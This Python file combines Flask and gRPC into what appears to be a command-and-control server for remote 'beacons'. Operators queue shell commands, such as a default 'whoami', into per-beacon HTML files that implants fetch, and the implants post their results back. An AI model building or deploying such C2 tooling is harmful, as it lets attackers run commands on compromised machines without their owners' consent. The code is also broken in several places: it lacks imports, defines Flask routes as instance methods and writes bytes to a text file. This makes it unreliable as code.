from flask import *
import grpc
from concurrent import futures
import time
import protobuff_pb2_grpc as pb2_grpc
import protobuff_pb2 as pb2

app = Flask(__name__)

class RunFlask(pb2_grpc.UnaryServicer):
    def __init__(self, *args, **kwargs):
        self.response = ''

    def GetServerResponse(self, request, context):

        # We need an ID (ID for beacon) and message (What to tell the beacon)
        message = request.message
        ID = request.bID
        opt = request.opt
        if set(ID).difference(ascii_letters + digits):
            # We're not going to bother with input sanitization here
            # If we receive special characters just drop it entirely
            pass
        else:
            if opt == 'SC':
                f = open(f"/var/www/html/{ID}.html", "a")
                f.write(message)
                f.close()
                result = f'Received command, wrote {message} to file {ID}'
                result = {'message': result, 'received': True}
                return pb2.MessageResponse(**result)
            elif opt == 'GR':
                result = f'Getting status of beacon {ID}'
                result = {'message': self.response, 'received': True}
                return pb2.MessageResponse(**result)

    @app.route("/")
    def home(self):
        # Grab the appsessionid value from the headers
        val = request.headers['APPSESSIONID']
        if set(val).difference(ascii_letters + digits):
            # We're not going to bother with input sanitization here
            # If we receive special characters just drop it entirely
            pass
        else:
            message = b"cmd;whoami;null "
            print(f'headers:{val}')
            # create a new page for the UUID we got from the headers
            f = open(f"/var/www/html/{val}.html", "a")
            f.write(message)
            f.close()
            return ('')

    @app.route('/<path:filename>', methods=['GET', 'POST'])
    def index(self, filename):
        if request.method == 'GET':
            val = {request.headers['APPSESSIONID']}
            stats = f'Host {val} grabbed command'
            return send_from_directory('.', filename)
            # result = {'message': stats, 'received': True}
            # return pb2.MessageResponse(**result)

        return jsonify(request.data)

    @app.route("/<path:filename>", methods=['POST'])
    def results(self):
        if request.method == 'POST':
            val = {request.headers['APPSESSIONID']}
            print(f'Result: {request.data} from beacon: {val}')
            self.response = request.data
            return 'HELO'

def serve():
    server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
    pb2_grpc.add_UnaryServicer_to_server(RunFlask(), server)
    server.add_insecure_port('[::]:50051')
    server.start()
    app.run(debug=True)
    server.wait_for_termination()

if __name__ == "__main__":
    serve()
